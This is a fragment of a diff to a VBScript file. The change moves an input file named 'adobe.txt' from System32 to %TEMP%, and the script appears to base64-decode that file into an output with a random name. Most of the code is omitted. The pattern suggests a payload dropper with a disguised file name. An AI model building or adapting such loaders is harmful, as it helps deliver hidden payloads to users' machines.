@@ -1,8 +1,13 @@
 Option Explicit
 
 Dim a, inFile, fso, ts, b64, bytes, outFile, curDir, loopCount
+Dim shell, tempPath, filePath
 
-a = "C:\Windows\System32\adobe.txt"
+Set shell = CreateObject("WScript.Shell")
+tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
+
+a = tempPath & "\adobe.txt"
+
 
 ' Check file path
 inFile = a
@@ -74,5 +79,6 @@ Private Function RandomName(ByVal n)
     RandomName = RandomName & Mid(chars, Int(Rnd * Len(chars)) + 1, 1)
   Next
 End Function
+
 
 
